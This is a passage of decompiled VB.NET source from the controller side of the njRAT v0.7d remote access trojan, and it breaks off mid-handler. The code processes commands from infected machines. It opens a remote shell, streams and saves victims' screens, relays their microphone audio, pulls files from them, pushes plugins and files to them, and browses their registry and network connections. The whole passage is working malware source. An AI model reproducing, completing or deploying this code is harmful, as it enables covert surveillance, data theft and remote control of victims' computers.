Imports Microsoft.VisualBasic.CompilerServices
Imports NJRAT
Imports System.Collections
Imports System.Collections.Generic
Imports System.Drawing
Imports System.Drawing.Imaging
Imports System.IO
Imports System.Net.NetworkInformation
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports WinMM
Imports NJRAT.njRAT

<StandardModule> _
Friend NotInheritable Class Class7
    Public Shared class8_0 As Class7.Class8
    Public Shared string_0 As String
    Public Shared sk_0 As SK
    Public Shared long_0 As Long
    Public Shared long_1 As Long
    Public Shared string_1 As String
    Public Shared form1_0 As Form1
    Public Shared int_0 As Integer
    Public Shared int_1 As Integer
    Public Shared int_2 As Integer
    Public Shared int_3 As Integer
    Public Shared int_4 As Integer
    Public Shared int_5 As Integer
    Public Shared int_6 As Integer
    Public Shared int_7 As Integer
    Public Shared int_8 As Integer
    Public Shared int_9 As Integer
    Public Shared int_10 As Integer
    Public Shared int_11 As Integer
    Public Shared list_0 As List(Of String)
    Public Shared list_1 As List(Of Class7.Class9)
    Public Shared notf_0 As notf
    Private Shared list_2 As List(Of Client)
    Public Shared gclass3_0 As GClass3
    Public Shared waveOut_0 As WaveOut
    Public Shared waveOut_1 As WaveOut
    Public Shared bool_0 As Boolean

    Shared Sub New()
        Class7.class8_0 = New Class7.Class8()
        Class7.string_0 = "njRAT v0.7d"
        Class7.long_0 = 0L
        Class7.long_1 = 0L
        Class7.string_1 = "|'|'|"
        Class7.int_0 = 1
        Class7.int_1 = 2
        Class7.int_2 = 3
        Class7.int_3 = 4
        Class7.int_4 = 5
        Class7.int_5 = 6
        Class7.int_6 = 7
        Class7.int_7 = 8
        Class7.int_8 = 9
        Class7.int_9 = 10
        Class7.int_10 = 11
        Class7.int_11 = 12
        Class7.list_0 = New List(Of String)()
        Class7.list_1 = New List(Of Class7.Class9)()
        Class7.notf_0 = New notf()
        Class7.list_2 = New List(Of Client)()
        Class7.gclass3_0 = New GClass3(Application.StartupPath & "\GeoIP.dat", 1)
        Class7.bool_0 = True
    End Sub

    Public Shared Function smethod_0(string_2 As String, string_3 As String) As Class7.Class9
        Dim enumerator1 As List(Of Class7.Class9).Enumerator
        If string_2 IsNot Nothing Then
            Try
                enumerator1 = Class7.list_1.GetEnumerator()
                While enumerator1.MoveNext()
                    Dim current As Class7.Class9 = enumerator1.Current
                    If Operators.CompareString(current.string_0, string_2.ToLower(), False) = 0 Then
                        Return current
                    End If
                End While
            Finally
                enumerator1.Dispose()
            End Try
        End If
        Dim enumerator2 As List(Of Class7.Class9).Enumerator
        If string_3 IsNot Nothing Then
            Try
                enumerator2 = Class7.list_1.GetEnumerator()
                While enumerator2.MoveNext()
                    Dim current As Class7.Class9 = enumerator2.Current
                    If Operators.CompareString(current.string_1, string_3, False) = 0 Then
                        Return current
                    End If
                End While
            Finally
                enumerator2.Dispose()
            End Try
        End If
        Return DirectCast(Nothing, Class7.Class9)
    End Function

    Public Shared Function smethod_1(dataGridViewRow_0 As DataGridViewRow) As Object
        Dim obj As Object
        Try
            obj = If(dataGridViewRow_0 IsNot Nothing, (If(dataGridViewRow_0.Tag IsNot Nothing, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(DirectCast("[", Object), dataGridViewRow_0.Cells(Class7.int_0).Value), DirectCast("/", Object)), dataGridViewRow_0.Cells(Class7.int_3).Value), DirectCast("/", Object)), dataGridViewRow_0.Cells(Class7.int_7).Value), DirectCast("]", Object)), DirectCast("?", Object))), DirectCast("?", Object))
        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            obj = DirectCast("?", Object)
            ProjectData.ClearProjectError()
        End Try
        Return obj
    End Function

    Public Shared Function smethod_2(client_0 As Client, class9_0 As Class7.Class9, bool_1 As Boolean) As Boolean
        Try
            Dim string_0 As String
            If bool_1 Then
                string_0 = "ret" & Class7.string_1 & class9_0.string_1 & Class7.string_1
            Else
                string_0 = "inv" & Class7.string_1 & class9_0.string_1 & Class7.string_1 & client_0.ip() & Class7.string_1
            End If
            Dim memoryStream As New MemoryStream()
            memoryStream.Write(Class6.smethod_11(string_0), 0, string_0.Length)
            If Not client_0.plg.Contains(class9_0.string_1) Then
                memoryStream.Write(class9_0.byte_0, 0, class9_0.byte_0.Length)
            Else
                memoryStream.WriteByte(CByte(40))
            End If
            client_0.Send(memoryStream.ToArray())
            Return True
        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
        Return False
    End Function

    Public Shared Function smethod_3(string_2 As String) As Form
        Return My.Application.OpenForms(string_2)
    End Function

    Public Shared Sub smethod_4(object_0 As Object)
        Dim enumerator As IEnumerator = Class7.form1_0.L1.SelectedRows.GetEnumerator()
        enumerator.Reset()
        Dim b As Byte()
        If TypeOf NewLateBinding.LateIndexGet(object_0, New Object(0) {DirectCast(0, Object)}, DirectCast(Nothing, String())) Is String Then
            Dim string_0 As String = Conversions.ToString(NewLateBinding.LateIndexGet(object_0, New Object(0) {DirectCast(0, Object)}, DirectCast(Nothing, String())))
            Dim numArray As Byte() = Class6.smethod_11(string_0)
            NewLateBinding.LateIndexSetComplex(object_0, New Object(1) {DirectCast(0, Object), DirectCast(string_0, Object)}, DirectCast(Nothing, String()), 1 <> 0, 0 <> 0)
            b = numArray
        Else
            b = DirectCast(NewLateBinding.LateIndexGet(object_0, New Object(0) {DirectCast(0, Object)}, DirectCast(Nothing, String())), Byte())
        End If
        While enumerator.MoveNext()
            Dim dataGridViewRow As DataGridViewRow = DirectCast(enumerator.Current, DataGridViewRow)
            DirectCast(dataGridViewRow.Tag, Client).Send(b)
            Dim defaultCellStyle As DataGridViewCellStyle = dataGridViewRow.DefaultCellStyle
            Dim obj As Object = NewLateBinding.LateIndexGet(object_0, New Object(0) {DirectCast(1, Object)}, DirectCast(Nothing, String()))
            Dim color1 As Color
            Dim color2 As Color = If(obj IsNot Nothing, CType(obj, Color), color1)
            defaultCellStyle.ForeColor = color2
        End While
    End Sub

    Public Shared Sub smethod_5(object_0 As Object)
        Dim client_0 As Client = DirectCast(NewLateBinding.LateIndexGet(object_0, New Object(0) {DirectCast(0, Object)}, DirectCast(Nothing, String())), Client)
        Dim byte_0_1 As Byte() = DirectCast(NewLateBinding.LateIndexGet(object_0, New Object(0) {DirectCast(1, Object)}, DirectCast(Nothing, String())), Byte())
        Dim strArray1 As String() = Strings.Split(Class6.smethod_12(byte_0_1), Class7.string_1, -1, CompareMethod.Binary)
        Try
            Dim Left1 As String = strArray1(0)
            If Operators.CompareString(Left1, "Ex", False) = 0 Then
                Dim manager As Manager = DirectCast(Class7.smethod_3("m" & client_0.ip()), Manager)
                If manager Is Nothing Then
                    Return
                End If
                manager.SL.Text = strArray1(1)
                If Not strArray1(1).StartsWith("rs:!-->") Then
                    Return
                End If
                manager.shStarted = 0
            ElseIf Operators.CompareString(Left1, "srv", False) = 0 Then
                Dim manager As Manager = DirectCast(Class7.smethod_3("m" & client_0.ip()), Manager)
                If manager Is Nothing OrElse Operators.CompareString(strArray1(1), "~", False) <> 0 Then
                    Return
                End If
                Dim list1 As New List(Of String)()
                Dim list2 As New List(Of ListViewItem)()
                Dim num1 As Integer = 2
                Dim num2 As Integer = strArray1.Length - 1
                Dim index1 As Integer = num1
                While index1 <= num2
                    Dim strArray2 As String() = Strings.Split(strArray1(index1), "[,]", -1, CompareMethod.Binary)
                    list1.Add(strArray2(0).ToLower())
                    If manager.LSRV.Items.ContainsKey(strArray2(0)) Then
                        Dim listViewItem As ListViewItem = manager.LSRV.Items(strArray2(0))
                        listViewItem.SubItems(3).Text = strArray2(3)
                        listViewItem.SubItems(4).Text = strArray2(4)
                    Else
                        Dim listViewItem As New ListViewItem(strArray2(0))
                        Dim num3 As Integer = 1
                        Dim num4 As Integer = strArray2.Length - 1
                        Dim index2 As Integer = num3
                        While index2 <= num4
                            listViewItem.SubItems.Add(strArray2(index2))
                            index2 += 1

                        End While
                        listViewItem.Name = strArray2(0)
                        list2.Add(listViewItem)
                        If list2.Count > 20 Then
                            manager.LSRV.Items.AddRange(list2.ToArray())
                            list2.Clear()
                        End If
                    End If
                    index1 += 1

                End While
                If list2.Count > 0 Then
                    manager.LSRV.Items.AddRange(list2.ToArray())
                    list2.Clear()
                End If
                Dim list3 As New List(Of String)()
                Try
                    For Each listViewItem As ListViewItem In manager.LSRV.Items
                        If Not list1.Contains(listViewItem.Text.ToLower()) Then
                            list3.Add(listViewItem.Text)
                        End If
                    Next
                Finally
                    Dim enumerator As IEnumerator
                    If TypeOf enumerator Is IDisposable Then
                        TryCast(enumerator, IDisposable).Dispose()
                    End If
                End Try
                Dim enumerator1 As List(Of String).Enumerator
                Try
                    enumerator1 = list3.GetEnumerator()
                    While enumerator1.MoveNext()
                        Dim current As String = enumerator1.Current
                        manager.LSRV.Items.RemoveByKey(current)
                    End While
                Finally
                    enumerator1.Dispose()
                End Try
                manager.srvNxt = True
                If Not manager.SrvFX Then
                    Return
                End If
                manager.SrvFX = False
                manager.LSRV.method_3()
            ElseIf Operators.CompareString(Left1, "tcp", False) = 0 Then
                Dim manager As Manager = DirectCast(Class7.smethod_3("m" & client_0.ip()), Manager)
                If manager Is Nothing Then
                    Return
                End If
                Dim stripProgressBar As ToolStripProgressBar = manager.pr
                Monitor.Enter(DirectCast(stripProgressBar, Object))
                Try
                    Dim Left2 As String = strArray1(1)
                    If Operators.CompareString(Left2, "~", False) = 0 Then
                        Dim strArray2 As String() = Strings.Split(strArray1(2), "*", -1, CompareMethod.Binary)
                        manager.pr.Value = 0
                        manager.pr.Maximum = strArray2.Length
                        Dim list As New List(Of ListViewItem)()
                        Dim num1 As Integer = 0
                        Dim num2 As Integer = strArray2.Length - 1
                        Dim index As Integer = num1
                        While index <= num2
                            Dim strArray3 As String() = Strings.Split(strArray2(index), ",", -1, CompareMethod.Binary)
                            If manager.LTCP.Items.ContainsKey(strArray3(0) & strArray3(1)) Then
                                Dim listViewItem As ListViewItem = manager.LTCP.Items(strArray3(0) & strArray3(1))
                                listViewItem.SubItems(4).Text = CType(Conversions.ToInteger(strArray3(2)), TcpState).ToString()
                                Dim foreColor As Color = listViewItem.ForeColor
                                Select Case Conversions.ToInteger(strArray3(2))
                                    Case 1, 8, 9, 11, 12
                                        listViewItem.ForeColor = Color.Red
                                        Exit Select
                                    Case 4
                                        listViewItem.ForeColor = Color.YellowGreen
                                        Exit Select
                                    Case 5
                                        listViewItem.ForeColor = Color.LimeGreen
                                        Exit Select
                                End Select
                            Else
                                Dim listViewItem As New ListViewItem(strArray3(0).Split(":"c)(0))
                                listViewItem.Name = strArray3(0) & strArray3(1)
                                listViewItem.Tag = DirectCast(strArray3(0) & strArray3(1), Object)
                                listViewItem.SubItems.Add(strArray3(0).Split(":"c)(1))
                                listViewItem.SubItems.Add(strArray3(1).Split(":"c)(0))
                                listViewItem.SubItems.Add(strArray3(1).Split(":"c)(1))
                                listViewItem.SubItems.Add(CType(Conversions.ToInteger(strArray3(2)), TcpState).ToString())
                                listViewItem.SubItems.Add(strArray3(3))
                                Select Case Conversions.ToInteger(strArray3(2))
                                    Case 1, 8, 9, 11, 12
                                        listViewItem.ForeColor = Color.Red
                                        Exit Select
                                    Case 3, 4
                                        listViewItem.ForeColor = Color.YellowGreen
                                        Exit Select
                                    Case 5
                                        listViewItem.ForeColor = Color.LimeGreen
                                        Exit Select
                                End Select
                                list.Add(listViewItem)
                                If list.Count > 20 Then
                                    manager.LTCP.Items.AddRange(list.ToArray())
                                    list.Clear()
                                    Dim columnHeader As ColumnHeader = manager.LTCP.columnHeader_0
                                    If columnHeader Is Nothing Then
                                        manager.LTCP.GClass9_ColumnClick(DirectCast(manager.LTCP, Object), New ColumnClickEventArgs(0))
                                    Else
                                        columnHeader.Tag = If(Not Operators.ConditionalCompareObjectEqual(columnHeader.Tag, DirectCast("+", Object), False), (If(Not Operators.ConditionalCompareObjectEqual(columnHeader.Tag, DirectCast("-", Object), False), DirectCast("-", Object), DirectCast("+", Object))), DirectCast("-", Object))
                                        manager.LTCP.GClass9_ColumnClick(DirectCast(manager.LTCP, Object), New ColumnClickEventArgs(columnHeader.Index))
                                    End If
                                End If
                            End If
                            index += 1

                        End While
                        If manager.TCPFX Then
                            manager.LTCP.method_3()
                            manager.TCPFX = False
                        End If
                        If list.Count > 0 Then
                            manager.LTCP.Items.AddRange(list.ToArray())
                            list.Clear()
                            Dim columnHeader As ColumnHeader = manager.LTCP.columnHeader_0
                            If columnHeader Is Nothing Then
                                manager.LTCP.GClass9_ColumnClick(DirectCast(manager.LTCP, Object), New ColumnClickEventArgs(0))
                            Else
                                columnHeader.Tag = If(Not Operators.ConditionalCompareObjectEqual(columnHeader.Tag, DirectCast("+", Object), False), (If(Not Operators.ConditionalCompareObjectEqual(columnHeader.Tag, DirectCast("-", Object), False), DirectCast("-", Object), DirectCast("+", Object))), DirectCast("-", Object))
                                manager.LTCP.GClass9_ColumnClick(DirectCast(manager.LTCP, Object), New ColumnClickEventArgs(columnHeader.Index))
                            End If
                        End If
                        manager.TCPNXT = True
                    ElseIf Operators.CompareString(Left2, "RM", False) = 0 Then
                        Dim num1 As Integer = 2
                        Dim num2 As Integer = strArray1.Length - 1
                        Dim index As Integer = num1
                        While index <= num2
                            manager.LTCP.Items.RemoveByKey(strArray1(index))
                            index += 1

                        End While
                    Else
                        If Operators.CompareString(Left2, "ER", False) <> 0 Then
                            Return
                        End If
                        manager.SL.Text = strArray1(2)
                    End If
                Finally
                    Monitor.[Exit](DirectCast(stripProgressBar, Object))
                End Try
            ElseIf Operators.CompareString(Left1, "MIC", False) = 0 Then
                If client_0.osk Is Nothing Then
                    client_0.isPL = True
                    Try
                        client_0.osk = Class7.sk_0.GetClient(strArray1(1))
                    Catch ex As Exception
                        ProjectData.SetProjectError(ex)
                        client_0.CN = False
                        ProjectData.ClearProjectError()
                    End Try
                End If
                If Class7.form1_0.InvokeRequired Then
                    Class7.form1_0.Invoke(New Delegate0(AddressOf Class7.smethod_5), New Object() {RuntimeHelpers.GetObjectValue(object_0)})
                Else
                    Dim mic1 As Mic = DirectCast(Class7.smethod_3("mic" & client_0.ip()), Mic)
                    Dim Left2 As String = strArray1(2)
                    If Operators.CompareString(Left2, "~", False) = 0 Then
                        If mic1 IsNot Nothing Then
                            Return
                        End If
                        Dim mic2 As New Mic()
                        mic2.Name = "mic" & client_0.ip()
                        mic2.sk = client_0
                        mic2.osk = client_0.osk
                        Dim num1 As Integer = 3
                        Dim num2 As Integer = strArray1.Length - 1
                        Dim index As Integer = num1
                        While index <= num2
                            mic2.ComboBox1.Items.Add(DirectCast(strArray1(index), Object))
                            index += 1

                        End While
                        DirectCast(mic2, Control).Show()
                    ElseIf Operators.CompareString(Left2, "!", False) = 0 Then
                        If mic1 Is Nothing Then
                            client_0.CN = False
                        Else
                            Dim numArray As Byte() = DirectCast(NewLateBinding.LateIndexGet(DirectCast(Class6.smethod_9(byte_0_1, strArray1(3) & Class7.string_1), Object), New Object(0) {DirectCast(1, Object)}, DirectCast(Nothing, String())), Byte())
                            If CInt(numArray(0)) = 31 Then
                                Dim byte_0_2 As Byte() = numArray
                                Dim flag As Boolean = False

                                Dim bool_0 As Boolean = flag
                                numArray = Class6.smethod_8(byte_0_2, bool_0)
                            End If
                            mic1.Text = (Class6.smethod_17(CLng(numArray.Length)) & " ") + mic1.QQ
                            If Conversions.ToInteger(strArray1(3)) = 0 Then
                                Class7.waveOut_0.Write(numArray)
                            Else
                                Class7.waveOut_1.Write(numArray)
                            End If
                        End If
                    Else
                        If Operators.CompareString(Left2, "ER", False) <> 0 Then
                            Return
                        End If
                        If mic1 Is Nothing Then
                            client_0.CN = False
                        Else
                            mic1.ComboBox1.Enabled = True
                            mic1.ComboBox2.Enabled = True
                            mic1.Button1.Text = "Start"
                        End If
                    End If
                End If
            ElseIf Operators.CompareString(Left1, "get", False) = 0 Then
                client_0.isPL = True
                client_0.t.Dispose()
                client_0.CN = False
                client_0.NoPing = True
                Dim up As up = DirectCast(Class7.smethod_3(strArray1(1) & strArray1(2)), up)
                If up Is Nothing Then
                    client_0.Close()
                Else
                    up.sk = client_0
                    Dim num As Integer = 0
                    client_0.Client.SendBufferSize = 524288
                    Try
                        While num <> up.SZ
                            If Not up.Closinge Then
                                Dim numArray As Byte() = New Byte(10240) {}
                                Dim size As Integer = up.FS.Read(numArray, 0, numArray.Length)
                                client_0.Client.Client.Poll(-1, SelectMode.SelectWrite)
                                client_0.Client.Client.Send(numArray, 0, size, SocketFlags.None)
                                num += size

                                Class7.long_0 += CLng(size)

                                Dim progressBar As ProgressBar = up.ProgressBar1
                                progressBar.Value = progressBar.Value + size
                            Else
                                GoTo label_106
                            End If
                        End While
                        up.Close()
                    Catch ex1 As Exception
                        ProjectData.SetProjectError(ex1)
                        Try
                            up.Text = "Connection lost"
                            up.Lv1.ForeColor = Color.Red
                        Catch ex2 As Exception
                            ProjectData.SetProjectError(ex2)
                            ProjectData.ClearProjectError()
                        End Try
                        ProjectData.ClearProjectError()
                    End Try
label_106:
                    client_0.Close()
                End If
            ElseIf Operators.CompareString(Left1, "post+", False) = 0 Then
                client_0.isPL = True
                Dim dw As New DW()
                dw.FN = strArray1(1)
                dw.SZ = Conversions.ToInteger(strArray1(2))
                dw.c = client_0
                dw.osk = client_0.osk
                dw.Name = dw.osk.ip() & strArray1(1)
                DirectCast(dw, Control).Show()
            ElseIf Operators.CompareString(Left1, "post", False) = 0 Then
                client_0.osk = Class7.sk_0.GetClient(strArray1(3))
                Try
                    client_0.t.Dispose()
                    client_0.CN = False
                    client_0.NoPing = True
                    Dim Instance As Object = object_0
                    Dim objArray1 As Object() = New Object(1) {DirectCast(1, Object), Nothing}
                    Dim objArray2 As Object() = objArray1
                    Dim index As Integer = 1
                    Dim string_0 As String = "post+" & Class7.string_1 & strArray1(1) & Class7.string_1 & strArray1(2) & Class7.string_1 & strArray1(3)
                    Dim numArray1 As Byte() = Class6.smethod_11(string_0)
                    objArray2(index) = DirectCast(numArray1, Object)
                    Dim Arguments As Object() = objArray1
                    Dim local As Object = Nothing
                    NewLateBinding.LateIndexSet(Instance, Arguments, DirectCast(local, String()))
                    Class7.form1_0.Invoke(New Delegate0(AddressOf Class7.smethod_5), New Object() {RuntimeHelpers.GetObjectValue(object_0)})
                    Dim num1 As Integer = 0
                    While Class7.smethod_3(strArray1(3) & strArray1(1)) Is Nothing
                        num1 += 1

                        If num1 = 1000 Then
                            Return
                        End If
                        Thread.Sleep(10)
                    End While
                    Dim client As Socket = client_0.Client.Client
                    string_0 = "ok"
                    Dim buffer As Byte() = Class6.smethod_11(string_0)
                    Dim offset As Integer = 0
                    Dim size As Integer = 2
                    Dim num2 As Integer = 0
                    client.Send(buffer, offset, size, CType(num2, SocketFlags))
                    client_0.Client.Client.ReceiveBufferSize = 1048576
                    Class7.long_0 += 2L

                    Dim numArray2 As Byte() = New Byte(1024) {}
                    Dim dw As DW = DirectCast(Class7.smethod_3(strArray1(3) & strArray1(1)), DW)
                    Dim num3 As Integer = 0
                    Try
                        While True
                            Dim numArray3 As Byte() = New Byte(1048576) {}
                            client_0.Client.Client.Poll(-1, SelectMode.SelectRead)
                            Dim count As Integer = client_0.Client.Client.Receive(numArray3, 0, numArray3.Length, SocketFlags.None)
                            dw.FS.Write(numArray3, 0, count)
                            Class7.long_1 += CLng(count)

                            num3 += count

                            Dim progressBar As ProgressBar = dw.ProgressBar1
                            progressBar.Value = progressBar.Value + count
                            dw.FS.Flush()
                            If num3 <> dw.SZ Then
                                Thread.Sleep(1)
                            Else
                                Exit While
                            End If
                        End While
                        dw.Button1.Enabled = False
                        dw.FS.Close()
                        dw.FS.Dispose()
                        If File.Exists(dw.folder) Then
                            File.Delete(dw.folder)
                        End If
                        File.Move(dw.tmp, dw.folder)
                        dw.Close()
                    Catch ex As Exception
                        ProjectData.SetProjectError(ex)
                        dw.Text = "connection lost"
                        dw.ForeColor = Color.Red
                        ProjectData.ClearProjectError()
                    End Try
                Catch ex As Exception
                    ProjectData.SetProjectError(ex)
                    ProjectData.ClearProjectError()
                End Try
                client_0.Close()
            ElseIf Operators.CompareString(Left1, "RG", False) = 0 Then
                If Class7.form1_0.InvokeRequired Then
                    Class7.form1_0.Invoke(New Delegate0(AddressOf Class7.smethod_5), New Object() {RuntimeHelpers.GetObjectValue(object_0)})
                Else
                    Dim manager As Manager = DirectCast(Class7.smethod_3("m" & client_0.ip()), Manager)
                    Dim stripProgressBar1 As ToolStripProgressBar = manager.pr
                    Monitor.Enter(DirectCast(stripProgressBar1, Object))
                    Try
                        Dim Left2 As String = strArray1(1)
                        If Operators.CompareString(Left2, "ER", False) = 0 Then
                            manager.RGk.Enabled = True
                            manager.RGLIST.Enabled = True
                            manager.SL.Text = Class6.smethod_16(strArray1(2))
                        Else
                            If Operators.CompareString(Left2, "~", False) <> 0 Then
                                Return
                            End If
                            manager.RGk.Enabled = True
                            manager.RGLIST.Enabled = True
                            Dim nodes As TreeNodeCollection = manager.RGk.Nodes
                            Dim treeNode1 As TreeNode = Class6.smethod_7(strArray1(2), manager.RGk.Nodes)
                            Dim list As New List(Of String)()
                            If manager.RGk.SelectedNode Is treeNode1 Then
                                manager.RGLIST.Items.Clear()
                            End If
                            Dim gclass13 As Manager.GClass13
                            If manager.RGCH.Contains(strArray1(2)) Then
                                gclass13 = DirectCast(manager.RGCH(strArray1(2)), Manager.GClass13)
                                gclass13.list_0.Clear()
                                gclass13.list_1.Clear()
                            Else
                                gclass13 = New Manager.GClass13()
                                gclass13.string_0 = strArray1(2)
                                manager.RGCH.Add(DirectCast(gclass13, Object), strArray1(2), DirectCast(Nothing, Object), DirectCast(Nothing, Object))
                            End If
                            Dim strArray2 As String() = Strings.Split(strArray1(3), "[,]", -1, CompareMethod.Binary)
                            manager.pr.Value = 0
                            manager.pr.Maximum = strArray2.Length
                            Dim strArray3 As String() = strArray2
                            Dim index As Integer = 0
                            While index < strArray3.Length
                                Dim str As String = strArray3(index)
                                If Operators.CompareString(str, String.Empty, False) <> 0 Then
                                    Dim strArray4 As String() = Strings.Split(str, "[;]", -1, CompareMethod.Binary)
                                    Try
                                        Dim stripProgressBar2 As ToolStripProgressBar = manager.pr
                                        stripProgressBar2.Value = stripProgressBar2.Value + 1
                                        If strArray4.Length > 1 Then
                                            If manager.RGk.SelectedNode Is treeNode1 Then
                                                Dim listViewItem As ListViewItem = manager.RGLIST.Items.Add(strArray4(0))
                                                listViewItem.SubItems.Add(strArray4(1))
                                                listViewItem.SubItems.Add(strArray4(2))
                                                listViewItem.ImageIndex = If(Operators.CompareString(strArray4(1), "String", False) <> 0, 2, 1)
                                            End If
                                            gclass13.list_0.Add(strArray4)
                                        Else
                                            gclass13.list_1.Add(strArray4(0))
                                            treeNode1.Nodes.Add(strArray4(0), strArray4(0))
                                            If Not treeNode1.Nodes.ContainsKey(strArray4(0)) Then
                                                list.Add(strArray4(0))
                                            End If
                                        End If
                                    Catch ex As Exception
                                        ProjectData.SetProjectError(ex)
                                        ProjectData.ClearProjectError()
                                    End Try
                                End If
                                index += 1

                            End While
                            Try
                                For Each treeNode2 As TreeNode In treeNode1.Nodes
                                    If list.Contains(treeNode2.Text) Then
                                        list.Remove(treeNode2.Text)
                                    End If
                                Next
                            Finally
                                Dim enumerator As IEnumerator
                                If TypeOf enumerator Is IDisposable Then
                                    TryCast(enumerator, IDisposable).Dispose()
                                End If
                            End Try
                            Dim enumerator1 As List(Of String).Enumerator
                            Try
                                enumerator1 = list.GetEnumerator()
                                While enumerator1.MoveNext()
                                    Dim current As String = enumerator1.Current
                                    treeNode1.Nodes.RemoveByKey(current)
                                End While
                            Finally
                                enumerator1.Dispose()
                            End Try
                            If treeNode1 Is manager.RGk.SelectedNode Then
                                treeNode1.Expand()
                            End If
                            manager.RGLIST.method_3()
                            manager.pr.Value = 0
                        End If
                    Finally
                        Monitor.[Exit](DirectCast(stripProgressBar1, Object))
                    End Try
                End If
            ElseIf Operators.CompareString(Left1, "rss", False) = 0 Then
                Dim manager As Manager = DirectCast(Class7.smethod_3("m" & client_0.ip()), Manager)
                If manager Is Nothing Then
                    Return
                End If
                manager.shStarted = 2
                manager.T2.[ReadOnly] = False
                manager.T2.BackColor = Color.Black
            ElseIf Operators.CompareString(Left1, "rs", False) = 0 Then
                Dim manager As Manager = DirectCast(Class7.smethod_3("m" & client_0.ip()), Manager)
                If manager Is Nothing Then
                    Return
                End If
                Dim richTextBox As RichTextBox = manager.T1
                Monitor.Enter(DirectCast(richTextBox, Object))
                Try
                    manager.T1.SelectionStart = manager.T1.TextLength
                    manager.T1.AppendText(Class6.smethod_16(strArray1(1).Replace(vbCr & vbLf, String.Empty)) & vbCr & vbLf)
                    manager.T1.SelectionStart = manager.T1.TextLength
                    manager.T1.ScrollToCaret()
                Finally
                    Monitor.[Exit](DirectCast(richTextBox, Object))
                End Try
            ElseIf Operators.CompareString(Left1, "rsc", False) = 0 Then
                Dim manager As Manager = DirectCast(Class7.smethod_3("m" & client_0.ip()), Manager)
                If manager Is Nothing Then
                    Return
                End If
                manager.T2.[ReadOnly] = True
                manager.T2.BackColor = Color.Gray
                manager.shStarted = 0
            ElseIf Operators.CompareString(Left1, "PLG", False) = 0 Then
                Dim class9 As Class7.Class9 = Class7.smethod_0("plg.dll", DirectCast(Nothing, String))
                Dim memoryStream As New MemoryStream()
                Dim string_0 As String = "PLG" & Class7.string_1
                Dim buffer As Byte() = Class6.smethod_11(string_0)
                memoryStream.Write(buffer, 0, buffer.Length)
                memoryStream.Write(class9.byte_0, 0, class9.byte_0.Length)
                client_0.Send(memoryStream.ToArray())
            ElseIf Operators.CompareString(Left1, "sc~", False) = 0 Then
                If client_0.osk Is Nothing Then
                    client_0.isPL = True
                    Try
                        client_0.osk = Class7.sk_0.GetClient(strArray1(1))
                    Catch ex As Exception
                        ProjectData.SetProjectError(ex)
                        client_0.CN = False
                        ProjectData.ClearProjectError()
                    End Try
                End If
                If Class7.form1_0.InvokeRequired Then
                    Class7.form1_0.Invoke(New Delegate0(AddressOf Class7.smethod_5), New Object() {RuntimeHelpers.GetObjectValue(object_0)})
                Else
                    If DirectCast(Class7.smethod_3("sc" & client_0.ip()), sc) IsNot Nothing Then
                        Return
                    End If
                    Dim sc As New sc()
                    sc.osk = client_0.osk
                    sc.sz = New Size(Conversions.ToInteger(strArray1(2)), Conversions.ToInteger(strArray1(3)))
                    sc.p.Image = DirectCast(Nothing, Image)
                    sc.Oimg = New Bitmap(sc.sz.Width, sc.sz.Height, PixelFormat.Format32bppPArgb)
                    sc.sk = client_0
                    sc.Name = "sc" & client_0.ip()
                    DirectCast(sc, Control).Show()
                End If
            ElseIf Operators.CompareString(Left1, "scPK", False) = 0 Then
                Dim sc1 As sc = DirectCast(Class7.smethod_3("sc" & strArray1(1)), sc)
                If sc1 Is Nothing Then
                    client_0.CN = False
                Else
                    Dim sc2 As sc = sc1
                    Monitor.Enter(DirectCast(sc2, Object))
                    Try
                        Dim sc3 As sc = sc1
                        sc3.fps = sc3.fps + 1
                        sc1.pkt = CLng(byte_0_1.Length)
                        If strArray1(2).Length = 0 Then
                            Return
                        End If
                        Dim bitmap As Bitmap = DirectCast(Image.FromStream(DirectCast(New MemoryStream(DirectCast(NewLateBinding.LateIndexGet(DirectCast(Class6.smethod_9(byte_0_1, strArray1(2) & Class7.string_1), Object), New Object(0) {DirectCast(1, Object)}, DirectCast(Nothing, String())), Byte())), Stream)), Bitmap)
                        If bitmap.Width = 0 Then
                            Return
                        End If
                        Dim strArray2 As String() = Strings.Split(strArray1(2), "-", -1, CompareMethod.Binary)
                        Dim strArray3 As String() = Strings.Split(strArray2(0), ",", -1, CompareMethod.Binary)
                        Dim size As New Size(Conversions.ToInteger(strArray3(0)), Conversions.ToInteger(strArray3(1)))
                        Dim height As Integer = Conversions.ToInteger(strArray2(1))
                        If sc1.Oimg.Size <> size Then
                            sc1.Oimg = New Bitmap(size.Width, size.Height, PixelFormat.Format32bppPArgb)
                        End If
                        Dim format As PixelFormat = PixelFormat.Format32bppArgb
                        Dim y As Integer = 0
                        Dim num1 As Integer = 2
                        Dim num2 As Integer = strArray2.Length - 1
                        Dim index As Integer = num1
                        While index <= num2
                            Dim strArray4 As String() = Strings.Split(strArray2(index), ",", -1, CompareMethod.Binary)
                            Dim rect As New Rectangle(Conversions.ToInteger(strArray4(0)), Conversions.ToInteger(strArray4(1)), bitmap.Width, height)
                            Dim bitmapdata1 As BitmapData = sc1.Oimg.LockBits(rect, ImageLockMode.[WriteOnly], format)
                            Dim bitmapdata2 As BitmapData = bitmap.LockBits(New Rectangle(0, y, rect.Width, rect.Height), ImageLockMode.[ReadOnly], format)
                            Dim numArray As Byte() = New Byte(Math.Abs(bitmapdata1.Stride) * bitmapdata1.Height - 1 + 1 - 1) {}
                            Class6.memcpy(bitmapdata1.Scan0, bitmapdata2.Scan0, numArray.Length)
                            sc1.Oimg.UnlockBits(bitmapdata1)
                            bitmap.UnlockBits(bitmapdata2)
                            y += height

                            index += 1

                        End While
                        sc1.p.Image = DirectCast(DirectCast(sc1.Oimg, Image).Clone(), Image)
                        If Not sc1.CheckBox3.Checked Then
                            Return
                        End If
                        Try
                            sc1.Oimg.Save(sc1.Folder + DateAndTime.Now.ToString("yyMMddhhmmssfff") & ".jpg", ImageFormat.Jpeg)
                        Catch ex As Exception
                            ProjectData.SetProjectError(ex)
                            ProjectData.ClearProjectError()
                        End Try
                    Finally
                        Monitor.[Exit](DirectCast(sc2, Object))
                    End Try
                End If
            ElseIf Operators.CompareString(Left1, "CH", False) = 0 Then
                If client_0.osk Is Nothing Then
                    client_0.isPL = True
                    Try
